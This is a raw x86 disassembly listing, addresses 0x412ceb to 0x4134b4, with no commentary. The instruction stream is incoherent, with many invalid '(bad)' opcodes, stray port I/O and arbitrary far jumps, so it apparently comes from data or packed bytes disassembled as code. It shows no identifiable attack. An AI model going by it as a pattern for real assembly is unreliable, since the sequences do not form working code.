  412ceb:	mov    bl,0x91
  412ced:	js     0x412d60
  412cef:	push   cs
  412cf0:	cmp    DWORD PTR [ecx+eax*1+0x1ef4a760],edi
  412cf7:	loope  0x412c7d
  412cf9:	(bad)  
  412cfa:	stos   DWORD PTR es:[edi],eax
  412cfb:	mov    cl,0x62
  412cfd:	gs jbe 0x412cd1
  412d00:	in     eax,dx
  412d01:	xor    dl,BYTE PTR [edx+esi*1]
  412d04:	jne    0x412d80
  412d06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d07:	in     al,dx
  412d08:	or     al,0xfe
  412d0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d0b:	mov    bl,0x6b
  412d0d:	mov    dl,0x9
  412d0f:	ins    DWORD PTR es:[edi],dx
  412d10:	xchg   ebp,eax
  412d11:	mov    al,ds:0xc5298e13
  412d16:	push   esi
  412d17:	pushf  
  412d18:	dec    edi
  412d19:	rcl    DWORD PTR [edi+0x374a5c30],0x60
  412d20:	ret    
  412d21:	sbb    dl,BYTE PTR [esi+0x44bd23d8]
  412d27:	mov    bh,0xbd
  412d29:	test   eax,0x52b86c49
  412d2e:	mov    ebp,DWORD PTR [esi+0x3f0acfea]
  412d34:	add    al,0x37
  412d36:	and    ecx,DWORD PTR ds:0x719c6184
  412d3c:	shl    ebx,1
  412d3e:	loope  0x412ce3
  412d40:	jb     0x412d5c
  412d42:	call   0xe944babc
  412d47:	or     al,0x51
  412d49:	mov    ds:0x7a994648,eax
  412d4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d4f:	mov    ah,0x7c
  412d51:	pop    edi
  412d52:	xor    al,0x9
  412d54:	sahf   
  412d55:	mov    ecx,0xa5318c2d
  412d5a:	dec    BYTE PTR [edi+ebx*2+0x1bed9f15]
  412d61:	pusha  
  412d62:	into   
  412d63:	pop    esi
  412d64:	or     BYTE PTR [ebx],bh
  412d66:	retf   0x22fb
  412d69:	aam    0xb2
  412d6b:	in     eax,0x3b
  412d6d:	dec    eax
  412d6e:	test   bl,bh
  412d70:	aas    
  412d71:	out    dx,eax
  412d72:	(bad)  
  412d74:	repz fild QWORD PTR [ecx-0x56ab127e]
  412d7b:	inc    edx
  412d7c:	mov    esp,0xe113e394
  412d81:	fsub   st(7),st
  412d83:	xor    al,0x1b
  412d85:	dec    eax
  412d86:	fdiv   DWORD PTR [edi]
  412d88:	mov    ch,BYTE PTR [eax]
  412d8a:	sar    bl,cl
  412d8c:	out    dx,al
  412d8d:	pop    edx
  412d8e:	jmp    0xf938:0xcffc20f9
  412d95:	inc    esp
  412d96:	inc    esp
  412d97:	add    eax,0xdd0a71da
  412d9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d9d:	mov    bl,0x3f
  412d9f:	out    0x81,al
  412da1:	dec    ecx
  412da2:	sbb    DWORD PTR ds:0xb8171ae5,ecx
  412da8:	stc    
  412da9:	cwde   
  412daa:	adc    BYTE PTR [ebx+0xf],ch
  412dad:	cmp    cl,bl
  412daf:	cmp    BYTE PTR [edx-0x6d],0x10
  412db3:	xor    ah,ch
  412db5:	call   0x3baa:0x65f7c20e
  412dbc:	call   0xefa8:0xbb464bc3
  412dc3:	pusha  
  412dc4:	rcr    bl,1
  412dc6:	aaa    
  412dc7:	lock in al,dx
  412dc9:	add    cl,BYTE PTR [edx]
  412dcb:	retw   
  412dcd:	imul   esp,esp,0xffffffd0
  412dd0:	aaa    
  412dd1:	sbb    eax,0x9f592813
  412dd6:	in     al,0x5f
  412dd8:	push   ss
  412dd9:	das    
  412dda:	lahf   
  412ddb:	test   bl,bl
  412ddd:	retf   
  412dde:	add    DWORD PTR [ecx+0x5da4ba87],0xe6ae34bf
  412de8:	sbb    DWORD PTR [edx],0x171759e3
  412dee:	clc    
  412def:	cmp    BYTE PTR [esi],ah
  412df1:	push   ebp
  412df2:	stos   BYTE PTR es:[edi],al
  412df3:	add    eax,0x94090973
  412df8:	pop    si
  412dfa:	lods   eax,DWORD PTR ds:[esi]
  412dfb:	mov    cl,0x9b
  412dfd:	pop    edx
  412dfe:	or     bh,BYTE PTR [edi+edi*8-0x48]
  412e02:	mov    bh,bh
  412e04:	sbb    al,0x33
  412e06:	sbb    al,0x52
  412e08:	mov    eax,ds:0x8a33e237
  412e0d:	xchg   DWORD PTR [esi-0x78b6a2a],ecx
  412e13:	je     0x412dca
  412e15:	mov    esp,0x2915a090
  412e1a:	sub    eax,0xdabe9c4
  412e1f:	inc    eax
  412e20:	mov    cl,0xd
  412e22:	test   eax,0x9d2d58fc
  412e27:	int3   
  412e28:	repz jg 0x412e7f
  412e2b:	test   DWORD PTR [ebx-0x6c],0xccd4b9bb
  412e32:	jae    0x412e7e
  412e34:	fs jne 0x412dc2
  412e37:	addr16 jb 0x412e20
  412e3a:	push   esi
  412e3b:	out    dx,eax
  412e3c:	sbb    BYTE PTR [ecx-0x5a581c74],ah
  412e42:	pop    ss
  412e43:	jae    0x412e32
  412e45:	out    dx,al
  412e46:	inc    edx
  412e47:	fmul   DWORD PTR [edx]
  412e49:	add    esp,edi
  412e4b:	jns    0x412e5e
  412e4d:	jae    0x412ead
  412e4f:	outs   dx,DWORD PTR ds:[esi]
  412e50:	test   eax,0x5ab98fd6
  412e55:	xchg   ebp,eax
  412e56:	or     esp,edx
  412e58:	mov    ah,0x8f
  412e5a:	dec    esi
  412e5b:	or     ebp,DWORD PTR [eax]
  412e5d:	add    eax,0xffffffcc
  412e60:	loopne 0x412e3b
  412e62:	jp     0x412eae
  412e64:	inc    ebp
  412e65:	daa    
  412e66:	ds mov bh,0x31
  412e69:	enter  0x3a24,0x78
  412e6d:	test   eax,edx
  412e6f:	mov    ecx,0xdd84af1b
  412e74:	push   esp
  412e75:	jp     0x412e99
  412e77:	jle    0x412e14
  412e79:	retf   0xecd0
  412e7c:	sub    al,0x68
  412e7e:	repnz cli 
  412e80:	jle    0x412e09
  412e82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e83:	or     al,0x36
  412e85:	shl    BYTE PTR [edi],1
  412e87:	stos   DWORD PTR es:[edi],eax
  412e88:	fcom   QWORD PTR cs:[ebx+0x3a]
  412e8c:	xchg   edi,eax
  412e8d:	inc    edi
  412e8e:	(bad)  
  412e8f:	icebp  
  412e90:	ror    esp,0x1f
  412e93:	div    BYTE PTR [edx]
  412e95:	loope  0x412ef0
  412e97:	mov    ecx,0xd51a62ca
  412e9c:	cmp    eax,0x9c18d0a1
  412ea1:	fimul  WORD PTR [edi+0x76aceea3]
  412ea7:	(bad)  
  412ea8:	inc    ebp
  412ea9:	jl     0x412eff
  412eab:	push   esi
  412eac:	push   0x64
  412eae:	mov    dl,0xf7
  412eb0:	push   ss
  412eb1:	cmp    cl,BYTE PTR [ebp-0x395a97e2]
  412eb7:	cmp    dh,BYTE PTR ds:0x2e008770
  412ebd:	push   edx
  412ebe:	stos   BYTE PTR es:[edi],al
  412ebf:	imul   esp,DWORD PTR [eax+0x6a8c11a],0xffffffd6
  412ec6:	push   edx
  412ec7:	and    DWORD PTR [ebx-0x37cbbf15],0xfffffffc
  412ece:	ins    BYTE PTR es:[edi],dx
  412ecf:	jb     0x412e87
  412ed1:	in     al,0x4
  412ed3:	or     DWORD PTR [ecx+esi*4-0x4],0x6ef2d0de
  412edb:	es stos BYTE PTR es:[edi],al
  412edd:	mov    eax,0x5e937bb2
  412ee2:	mov    bh,0xeb
  412ee4:	pusha  
  412ee5:	mov    bl,0x46
  412ee7:	test   BYTE PTR [esi+0x3],al
  412eea:	xchg   ebx,eax
  412eeb:	sbb    bh,BYTE PTR [edx-0x16]
  412eee:	mov    al,ds:0x76ddde2f
  412ef3:	out    dx,eax
  412ef4:	scas   eax,DWORD PTR es:[edi]
  412ef5:	push   0xd31fc493
  412efa:	cmc    
  412efb:	jmp    0x412ef8
  412efd:	aad    0x88
  412eff:	dec    edi
  412f00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f01:	nop
  412f02:	cs jnp 0x412f1c
  412f05:	test   BYTE PTR [ebp-0x5d],ch
  412f08:	mov    ds:0x452cf6a2,al
  412f0d:	sbb    al,0xf3
  412f0f:	mov    al,ds:0x88d87706
  412f14:	popa   
  412f15:	mov    ds:0x5ac4eab0,al
  412f1a:	lea    edx,[ecx]
  412f1c:	inc    ebx
  412f1d:	enter  0xd30b,0x5e
  412f21:	sahf   
  412f22:	bound  edx,QWORD PTR [edi]
  412f24:	leave  
  412f25:	adc    DWORD PTR [esi+ecx*4],ebx
  412f28:	push   ss
  412f29:	(bad)  
  412f2b:	pop    es
  412f2c:	jmp    0x27f46546
  412f31:	shl    BYTE PTR [esi],0x8d
  412f34:	xchg   ebp,eax
  412f35:	fdivr  DWORD PTR [ebp-0x46]
  412f38:	jle    0x412eba
  412f3a:	mov    ch,0xe5
  412f3c:	adc    esi,DWORD PTR [ebx+0x36053839]
  412f42:	or     ch,BYTE PTR [esi+0x5699c953]
  412f48:	jle    0x412f61
  412f4a:	loope  0x412f9e
  412f4c:	xchg   DWORD PTR [ebp+0x7a2b8a1a],ebx
  412f52:	stos   BYTE PTR es:[edi],al
  412f53:	mov    esi,0x7fbab0e3
  412f58:	sbb    ch,ch
  412f5a:	pop    es
  412f5b:	retf   
  412f5c:	lea    esi,[ebx-0x68]
  412f5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f60:	pop    ds
  412f61:	out    dx,al
  412f62:	loope  0x412fbe
  412f64:	pop    ecx
  412f65:	popa   
  412f66:	xchg   esp,eax
  412f67:	cmp    eax,0x7077c322
  412f6c:	or     dl,BYTE PTR [edx-0x45]
  412f6f:	pop    edi
  412f70:	sbb    ebx,ebx
  412f72:	adc    BYTE PTR [esi+0x56568a81],ah
  412f78:	dec    edx
  412f79:	push   edx
  412f7a:	xchg   BYTE PTR [eax-0x6b1ba437],bh
  412f80:	mov    edx,0x6c618089
  412f85:	xor    al,BYTE PTR [ebx+eax*2]
  412f88:	jl     0x412f14
  412f8a:	pop    eax
  412f8b:	push   es
  412f8c:	loopne 0x412ff3
  412f8e:	push   eax
  412f8f:	aad    0xfb
  412f91:	lahf   
  412f92:	push   edi
  412f93:	jnp    0x412f95
  412f95:	cmp    BYTE PTR [esi-0x51],bl
  412f98:	into   
  412f99:	mov    bh,0xe3
  412f9b:	pusha  
  412f9c:	bound  ebp,QWORD PTR [edx+ecx*4+0x63391ff3]
  412fa3:	aam    0x36
  412fa5:	sahf   
  412fa6:	mov    bh,0xbe
  412fa8:	std    
  412fa9:	mov    es:0x480ce38a,al
  412faf:	clc    
  412fb0:	add    DWORD PTR [esi+0x3905d217],ebp
  412fb6:	add    al,0xab
  412fb8:	cmp    eax,0x7fb76723
  412fbd:	adc    ebp,DWORD PTR [esi+ebx*1+0x1e678029]
  412fc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412fc5:	in     eax,0xa0
  412fc7:	out    dx,al
  412fc8:	pop    edi
  412fc9:	jecxz  0x412fa5
  412fcb:	pushf  
  412fcc:	xor    DWORD PTR [ebx],esi
  412fce:	jo     0x412fcc
  412fd0:	inc    esi
  412fd1:	cmp    DWORD PTR [esi+0x23],esi
  412fd4:	push   edi
  412fd5:	fisubr WORD PTR [eax+edx*4]
  412fd8:	ret    0xd7fe
  412fdb:	mov    bl,0xe3
  412fdd:	dec    eax
  412fde:	xchg   edi,eax
  412fdf:	fidivr WORD PTR [edx-0x3d]
  412fe2:	(bad)  
  412fe3:	mov    al,0xb1
  412fe5:	or     DWORD PTR gs:[edi],esi
  412fe8:	sahf   
  412fe9:	mov    cl,0xeb
  412feb:	mov    ecx,0x1dbd8b1f
  412ff0:	jbe    0x412fc6
  412ff2:	std    
  412ff3:	and    ebp,DWORD PTR [ecx]
  412ff5:	mov    cl,0xf5
  412ff7:	sar    DWORD PTR ds:0xb2ef7d05,0x78
  412ffe:	mov    eax,0xd81d225e
  413003:	pmaddwd mm7,QWORD PTR [ecx]
  413006:	jmp    0x41305c
  413008:	adc    eax,0xc466ee8d
  41300d:	xchg   edx,eax
  41300e:	dec    esi
  41300f:	lea    edx,[esi+0x3f4cd6e5]
  413015:	push   es
  413016:	dec    ecx
  413017:	xlat   BYTE PTR ds:[ebx]
  413018:	mov    cs,WORD PTR [edx]
  41301a:	fbstp  TBYTE PTR [edi+0x7f]
  41301d:	and    eax,0xf829fb0c
  413022:	mov    eax,ds:0x9a91b7eb
  413027:	inc    esp
  413028:	enter  0xfb5,0x4b
  41302c:	stos   BYTE PTR es:[edi],al
  41302d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41302e:	adc    ch,BYTE PTR [edi-0x4174ac81]
  413034:	jp     0x412fd9
  413036:	mov    ch,0xbf
  413038:	jmp    0xfc1f31a5
  41303d:	inc    edi
  41303e:	add    BYTE PTR [ebx-0x59],dl
  413041:	sub    eax,0xc32f0083
  413046:	sub    ah,BYTE PTR [ecx]
  413048:	aam    0xef
  41304a:	and    al,0x3a
  41304c:	push   cs
  41304d:	xor    dl,BYTE PTR [edx]
  41304f:	jmp    0xba455096
  413054:	dec    eax
  413055:	mov    esp,0xff5fc8da
  41305a:	jl     0x413012
  41305c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41305d:	mov    ah,0x81
  41305f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413060:	das    
  413061:	lahf   
  413062:	retf   
  413063:	repnz xchg esi,eax
  413065:	shl    DWORD PTR [edi],cl
  413067:	adc    edx,esi
  413069:	jmp    0xbfa6:0xdc90bcaf
  413070:	push   eax
  413071:	sub    bl,BYTE PTR [edx+ebp*2+0x9]
  413075:	cdq    
  413076:	mov    fs,WORD PTR [ebp-0x1c4987aa]
  41307c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41307d:	aaa    
  41307e:	sbb    DWORD PTR [edx+edx*4+0xc],eax
  413082:	push   cs
  413083:	or     eax,0x803fa56a
  413088:	cli    
  413089:	push   ds
  41308a:	ror    BYTE PTR [ecx+0x7bf6528c],cl
  413090:	and    edx,DWORD PTR ds:0x6e7d4fa
  413096:	and    ah,BYTE PTR [ebx-0x2b6525ba]
  41309c:	arpl   WORD PTR ds:0x50f24a4,bx
  4130a2:	xchg   DWORD PTR [eax],ecx
  4130a4:	shrd   DWORD PTR [ecx-0x7c1e882e],ebp,cl
  4130ab:	cli    
  4130ac:	popf   
  4130ad:	inc    ebp
  4130ae:	mov    es,sp
  4130b1:	cdq    
  4130b2:	jmp    0xa8c7fa2f
  4130b7:	out    dx,eax
  4130b8:	sbb    BYTE PTR [edi+eax*8],0x83
  4130bc:	lods   al,BYTE PTR ds:[esi]
  4130bd:	mov    WORD PTR [edi+edx*2+0x6da47ef9],?
  4130c4:	adc    edi,DWORD PTR [ebp-0x6f0c1371]
  4130ca:	inc    esi
  4130cb:	pop    eax
  4130cc:	adc    al,0xf6
  4130ce:	js     0x413064
  4130d0:	rcl    BYTE PTR [ecx+eax*4-0x5a58af4f],cl
  4130d7:	cs jg  0x4130c7
  4130da:	out    dx,al
  4130db:	mov    WORD PTR [esi+eiz*1-0x733ad634],cs
  4130e2:	xlat   BYTE PTR ds:[ebx]
  4130e3:	shr    BYTE PTR [eax-0x1ccb1470],0x25
  4130ea:	jb     0x413137
  4130ec:	mov    ecx,ebx
  4130ee:	in     al,0x4b
  4130f0:	aas    
  4130f1:	jb     0x41311c
  4130f3:	jno    0x41314a
  4130f5:	sbb    al,0x31
  4130f7:	push   edi
  4130f8:	sub    ch,BYTE PTR [esi+eiz*4-0x27]
  4130fc:	xchg   ebx,eax
  4130fd:	sbb    BYTE PTR [ebp-0x42],bl
  413100:	mov    edx,0xa0e3f378
  413105:	sub    al,0x42
  413107:	aam    0x82
  413109:	adc    ebx,ebp
  41310b:	mov    edi,0xd1858aec
  413110:	adc    eax,DWORD PTR [eax-0x3aff94d4]
  413116:	iret   
  413117:	or     eax,DWORD PTR [eax+0x60]
  41311a:	test   al,0x19
  41311c:	fild   WORD PTR [ebp+0x7d]
  41311f:	mov    ds:0x3db40c4a,al
  413124:	lds    ebp,FWORD PTR [eax]
  413126:	retf   
  413127:	cmp    eax,0xe9e0b13b
  41312c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41312d:	shr    BYTE PTR [eax],0xf
  413130:	or     DWORD PTR [eax+edi*1-0x77b17e3d],esp
  413137:	cdq    
  413138:	ds dec ecx
  41313a:	jmp    0x4130cc
  41313c:	(bad)  
  41313d:	mov    DWORD PTR [edi-0x4e],0x1b7dcc9e
  413144:	mov    edi,0xbb5be6e2
  413149:	jle    0x41312b
  41314b:	mov    BYTE PTR [ebp-0x15b56d41],ch
  413151:	jne    0x413175
  413153:	dec    edi
  413154:	jg     0xeb96e90f
  41315a:	outs   dx,DWORD PTR ds:[esi]
  41315b:	push   ds
  41315c:	rol    dl,0x73
  41315f:	xchg   bh,cl
  413161:	mov    dl,0x5d
  413163:	pop    edx
  413164:	sahf   
  413165:	mov    ds:0x5141a987,eax
  41316a:	sbb    al,0xaa
  41316c:	(bad)  [ecx-0x2fefd907]
  413172:	scas   al,BYTE PTR es:[edi]
  413173:	cmp    bh,BYTE PTR [edx-0x2a]
  413176:	lock pop edx
  413178:	pushf  
  413179:	shr    BYTE PTR [esi-0x4a],1
  41317c:	int3   
  41317d:	sub    eax,0xb795d8dd
  413182:	shl    DWORD PTR [edx-0x28158db3],cl
  413188:	es daa 
  41318a:	repnz dec edx
  41318c:	fstp   DWORD PTR [ecx-0x689809fd]
  413192:	enter  0xeb01,0x9e
  413196:	adc    dl,BYTE PTR [ebp-0xc846a7f]
  41319c:	or     edx,ebp
  41319e:	daa    
  41319f:	inc    esp
  4131a0:	(bad)  
  4131a1:	push   ds
  4131a2:	push   esi
  4131a3:	xchg   esp,eax
  4131a4:	mov    ecx,DWORD PTR [ebx]
  4131a6:	ds xor al,cl
  4131a9:	jle    0x41314a
  4131ab:	mov    esp,0x63ee367b
  4131b0:	je     0x413150
  4131b2:	das    
  4131b3:	pusha  
  4131b4:	cmp    DWORD PTR [ecx+0x45],0x69a6c53
  4131bb:	pop    eax
  4131bc:	pushf  
  4131bd:	imul   ecx,DWORD PTR [ecx+edi*1+0x29],0xdd20210
  4131c5:	mov    ah,0x50
  4131c7:	int3   
  4131c8:	(bad)  
  4131c9:	pop    esp
  4131ca:	enter  0x9ad3,0x1b
  4131ce:	inc    ebx
  4131cf:	ret    0x1f2c
  4131d2:	pop    eax
  4131d3:	cmp    BYTE PTR [ebp+0x20370f4],bh
  4131d9:	sbb    eax,0x3d153337
  4131de:	mov    dl,0x29
  4131e0:	add    eax,0x5757f026
  4131e5:	(bad)  
  4131e6:	jnp    0x41325e
  4131e8:	dec    eax
  4131e9:	push   ds
  4131ea:	fist   WORD PTR [ecx]
  4131ec:	jle    0x4131de
  4131ee:	push   ecx
  4131ef:	fs loope 0x4131ca
  4131f2:	jno    0x4131be
  4131f4:	stc    
  4131f5:	ds pop esi
  4131f7:	jle    0x413199
  4131f9:	pop    eax
  4131fa:	in     eax,0xc2
  4131fc:	aas    
  4131fd:	push   ebx
  4131fe:	out    dx,eax
  4131ff:	xchg   edx,eax
  413200:	pop    ecx
  413201:	pop    ebp
  413202:	sbb    DWORD PTR [eax+esi*2-0x1dd5186f],ebx
  413209:	or     DWORD PTR [edx-0x7f0bf81],ebp
  41320f:	mov    edx,0x23bd48e7
  413214:	out    0x7c,eax
  413216:	sbb    ebp,DWORD PTR [ebp+0x209a4a5c]
  41321c:	stos   BYTE PTR es:[edi],al
  41321d:	das    
  41321e:	lods   eax,DWORD PTR gs:[esi]
  413220:	jmp    0x41326d
  413222:	pop    esi
  413223:	mov    ah,0x40
  413225:	xor    cl,BYTE PTR [edx-0x41]
  413228:	and    eax,0xc6097dab
  41322d:	pop    edx
  41322e:	dec    esp
  41322f:	sub    BYTE PTR [ebx],bl
  413231:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413232:	push   ds
  413233:	and    DWORD PTR [edx-0xc3ab7ee],ebp
  413239:	sub    esp,esi
  41323b:	ins    BYTE PTR es:[edi],dx
  41323c:	cld    
  41323d:	mov    cl,0x2a
  41323f:	dec    ecx
  413240:	stos   BYTE PTR es:[edi],al
  413241:	es stos BYTE PTR es:[edi],al
  413243:	imul   edx,DWORD PTR [eax+0x4ba32cc],0x31a1fd85
  41324d:	sbb    eax,edx
  41324f:	inc    esi
  413250:	or     ah,ch
  413252:	imul   ebp,DWORD PTR [esi],0x1
  413255:	jecxz  0x4131fc
  413257:	je     0x413233
  413259:	lods   eax,DWORD PTR ds:[esi]
  41325a:	gs ret 
  41325c:	pushf  
  41325d:	mov    bl,0xd8
  41325f:	sub    esi,DWORD PTR [ecx-0x55bb959]
  413265:	jecxz  0x4132c6
  413267:	loopne 0x4132d7
  413269:	cmp    BYTE PTR [ebx-0x39e490af],ah
  41326f:	dec    DWORD PTR [ecx-0x22]
  413272:	cmc    
  413273:	pop    ds
  413274:	jmp    DWORD PTR [edi-0x746f483a]
  41327a:	cmp    esi,edi
  41327c:	or     ah,BYTE PTR [edi+0x315c86fd]
  413282:	dec    ecx
  413283:	imul   esp,ebp,0x7f
  413286:	push   edx
  413287:	out    dx,al
  413288:	pop    ebp
  413289:	push   esi
  41328a:	mov    bh,0x8f
  41328c:	and    ecx,DWORD PTR [esi]
  41328e:	repz mov eax,0xa6a7cd3f
  413294:	nop
  413295:	iret   
  413296:	or     cl,BYTE PTR [ebx-0xc91ed22]
  41329c:	mov    ebx,0x351591ba
  4132a1:	lds    ecx,FWORD PTR ds:[edi]
  4132a4:	mov    ah,0xe2
  4132a6:	jnp    0x41324c
  4132a8:	jne    0x4132f6
  4132aa:	imul   DWORD PTR [edi-0x20]
  4132ad:	or     DWORD PTR [edx],0xffffffdc
  4132b0:	imul   ebp,DWORD PTR [ecx+eiz*2+0x3827c8f9],0xffffffec
  4132b8:	and    DWORD PTR [edi+0xd8818f9],esi
  4132be:	cwde   
  4132bf:	xchg   edi,eax
  4132c0:	mul    BYTE PTR ds:0x1f26af32
  4132c6:	scas   eax,DWORD PTR es:[edi]
  4132c7:	mov    BYTE PTR [ebp-0x700f091d],al
  4132cd:	push   esp
  4132ce:	pop    ds
  4132cf:	stos   DWORD PTR es:[edi],eax
  4132d0:	ds jns 0x41326e
  4132d3:	push   ss
  4132d4:	int    0x6
  4132d6:	xchg   BYTE PTR [ebx+0x3cc3adc7],dl
  4132dc:	ficom  WORD PTR [esp+edi*8]
  4132df:	pop    es
  4132e0:	pop    ecx
  4132e1:	xchg   esp,edi
  4132e3:	fild   WORD PTR [edx+edi*1+0x61]
  4132e7:	pop    esi
  4132e8:	mov    ebx,0xfea99822
  4132ed:	lods   al,BYTE PTR ds:[esi]
  4132ee:	shr    DWORD PTR [edx],cl
  4132f0:	das    
  4132f1:	push   es
  4132f2:	jmp    0x940a05df
  4132f7:	ins    BYTE PTR es:[edi],dx
  4132f8:	sub    eax,0xfe9893a1
  4132fd:	jns    0x41337d
  4132ff:	scas   eax,DWORD PTR es:[edi]
  413300:	mul    BYTE PTR [eax+0x7abc1a62]
  413306:	loope  0x4132b3
  413308:	js     0x413334
  41330a:	retf   
  41330b:	xchg   edx,eax
  41330c:	mov    BYTE PTR [esp+ebx*8-0x7e],0x48
  413311:	mov    edx,0xadd75f6
  413316:	outs   dx,BYTE PTR ds:[esi]
  413317:	(bad)
  41331a:	adc    eax,0xfe2398eb
  41331f:	fmul   QWORD PTR [ecx+0x7c4b782b]
  413326:	xor    al,0x90
  413328:	out    0x8e,al
  41332a:	pushf  
  41332b:	mov    esp,0x59b93dbd
  413330:	aas    
  413331:	lods   eax,DWORD PTR ds:[esi]
  413332:	cli    
  413333:	ss jmp 0x4133a9
  413336:	add    ch,cl
  413338:	cmc    
  413339:	sahf   
  41333a:	mov    edi,0x7c7967e7
  41333f:	sub    edx,DWORD PTR ds:[edx+0x5176664a]
  413346:	push   edx
  413347:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413348:	out    dx,eax
  413349:	dec    ebp
  41334a:	or     BYTE PTR [ecx+edi*8],0xf2
  41334e:	scas   al,BYTE PTR es:[edi]
  41334f:	mov    eax,0x9247a7cf
  413354:	sub    DWORD PTR [edx-0x242ae742],edx
  41335a:	mov    bl,0xec
  41335c:	push   ds
  41335d:	dec    ebp
  41335e:	fisubr WORD PTR [ebx]
  413360:	add    al,0xca
  413362:	ret    0x4a85
  413365:	sbb    esi,esi
  413367:	xor    edi,eax
  413369:	cwde   
  41336a:	mov    al,ds:0x8e980e48
  41336f:	pop    ds
  413370:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413371:	or     cl,bh
  413373:	mov    ah,0x6f
  413375:	rcr    edx,cl
  413377:	retf   
  413378:	jmp    0xd9a14773
  41337d:	enter  0xdc05,0x30
  413381:	mov    DWORD PTR [edi+0x57],esi
  413384:	in     eax,0x40
  413386:	mov    edi,0x7e278d9
  41338b:	jo     0x4133e9
  41338d:	jbe    0x413382
  41338f:	xchg   edi,eax
  413390:	cmp    eax,0xc59e6edd
  413395:	inc    edx
  413396:	inc    edx
  413397:	(bad)  
  413398:	adc    ebp,DWORD PTR [ecx]
  41339a:	das    
  41339b:	enter  0x3e2c,0x2c
  41339f:	mov    ch,0x28
  4133a1:	retfw  0x572c
  4133a5:	sbb    eax,0xfbaa3fa8
  4133aa:	lods   eax,DWORD PTR ds:[esi]
  4133ab:	xor    DWORD PTR [eax],esi
  4133ad:	sbb    ah,BYTE PTR [ebx+0x5c]
  4133b0:	mov    ebx,0x4ca6a990
  4133b5:	xchg   ebx,eax
  4133b6:	lods   eax,DWORD PTR ds:[esi]
  4133b7:	push   cs
  4133b8:	pop    esp
  4133b9:	pop    ds
  4133ba:	mov    eax,es:0xdf3b9d2f
  4133c0:	xor    al,0x87
  4133c3:	clc    
  4133c4:	pop    esi
  4133c5:	mov    dh,0x7f
  4133c7:	stos   BYTE PTR es:[edi],al
  4133c8:	cmp    esp,DWORD PTR [eax]
  4133ca:	push   0xdaa21dc3
  4133cf:	ret    0x3f41
  4133d2:	inc    edx
  4133d3:	mov    bl,0x49
  4133d5:	and    BYTE PTR ds:0x111eadd8,dl
  4133db:	xchg   esi,eax
  4133dc:	ins    DWORD PTR es:[edi],dx
  4133dd:	inc    edx
  4133de:	loop   0x4133fd
  4133e0:	test   BYTE PTR [edx],0xb0
  4133e3:	and    al,0x53
  4133e5:	ins    DWORD PTR es:[edi],dx
  4133e6:	adc    al,0xd3
  4133e8:	or     ebx,DWORD PTR [edx-0x3f2ec24b]
  4133ee:	sahf   
  4133ef:	push   ds
  4133f0:	int    0x99
  4133f2:	push   edi
  4133f3:	and    BYTE PTR [esi+0x78],al
  4133f6:	sbb    eax,DWORD PTR [edx]
  4133f8:	dec    ecx
  4133f9:	push   edi
  4133fa:	les    edi,FWORD PTR [edx]
  4133fc:	pop    ss
  4133fd:	(bad)  
  4133fe:	imul   esi,DWORD PTR [ebx],0xd35c467b
  413404:	rol    edi,0x7b
  413407:	xor    eax,DWORD PTR [eax+0x1b84415c]
  41340d:	retf   
  41340e:	pop    ebp
  41340f:	ins    DWORD PTR es:[edi],dx
  413410:	je     0x4133b9
  413412:	ret    
  413413:	push   edi
  413414:	aam    0x75
  413416:	mov    al,0xc9
  413418:	adc    al,0xfd
  41341a:	xor    eax,0x6714418
  41341f:	jno    0x4133d4
  413421:	mov    al,ds:0x5e5f4600
  413426:	xchg   ecx,eax
  413427:	dec    esi
  413428:	fisub  DWORD PTR [ebx+edi*1+0x7ebf31b3]
  41342f:	push   edi
  413430:	addr16 jmp 0xfa1e21a1
  413436:	loop   0x4134b0
  413438:	xchg   esp,eax
  413439:	push   esi
  41343a:	xor    DWORD PTR [ecx+0x71ddf782],edi
  413440:	nop
  413441:	inc    eax
  413442:	and    ebx,DWORD PTR ds:0x9796e24c
  413448:	int3   
  413449:	adc    eax,0x227fa010
  41344e:	adc    DWORD PTR [eax-0x21],edx
  413451:	xchg   ebp,eax
  413452:	xchg   esp,eax
  413453:	stc    
  413454:	cli    
  413455:	cdq    
  413456:	mov    ecx,0xb73f1aee
  41345b:	les    ecx,FWORD PTR ds:0x2968a35b
  413461:	out    0x28,eax
  413463:	jb     0x413449
  413465:	xor    al,dh
  413467:	pop    eax
  413468:	push   ebx
  413469:	lods   al,BYTE PTR ds:[esi]
  41346a:	retw   0xddb4
  41346e:	(bad)  
  41346f:	outs   dx,DWORD PTR ds:[esi]
  413470:	mov    edi,0x968e3f68
  413475:	jb     0x4134de
  413477:	dec    edi
  413478:	dec    ebx
  413479:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41347a:	xchg   edi,eax
  41347b:	mov    eax,ds:0xdd721a0f
  413480:	js     0x413414
  413482:	(bad)  
  413483:	adc    ah,BYTE PTR [ecx]
  413485:	inc    eax
  413486:	inc    edx
  413487:	sub    BYTE PTR [ecx],dl
  413489:	pop    eax
  41348a:	sahf   
  41348b:	sub    esi,DWORD PTR [ebp-0x6b]
  41348e:	lock sahf 
  413490:	js     0x41345b
  413492:	sahf   
  413493:	int    0xd7
  413495:	pop    eax
  413496:	int3   
  413497:	pop    esp
  413498:	jmp    0x7d207406
  41349d:	dec    ecx
  41349e:	sub    eax,DWORD PTR [ebp-0x77]
  4134a1:	jl     0x41346a
  4134a3:	ss jno 0x41346d
  4134a6:	loope  0x41347b
  4134a8:	in     eax,0xb7
  4134aa:	add    al,0x35
  4134ac:	xchg   ebx,eax
  4134ad:	addr16 test al,0x4d
  4134b0:	jge    0x41347b
  4134b2:	mov    al,0x27
  4134b4:	fild   QWORD PTR [eax-0x74]
